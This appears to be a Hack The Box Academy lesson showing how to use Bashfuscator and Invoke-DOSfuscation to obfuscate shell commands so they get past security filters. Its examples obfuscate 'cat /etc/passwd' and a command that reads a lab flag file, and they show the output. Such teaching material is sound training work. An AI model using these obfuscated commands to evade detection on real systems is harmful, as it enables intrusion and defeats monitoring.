
If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for `Linux` and another for `Windows.`

## Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```shell-session
Pangulin@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Pangulin@htb[/htb]$ cd Bashfuscator
Pangulin@htb[/htb]$ pip3 install setuptools==65
Pangulin@htb[/htb]$ python3 setup.py install --user
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

```shell-session
Pangulin@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

```shell-session
Pangulin@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:

```shell-session
Pangulin@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

## Windows (DOSfuscation)

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:

  Evasion Tools

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:

```cmd-session
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

``Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
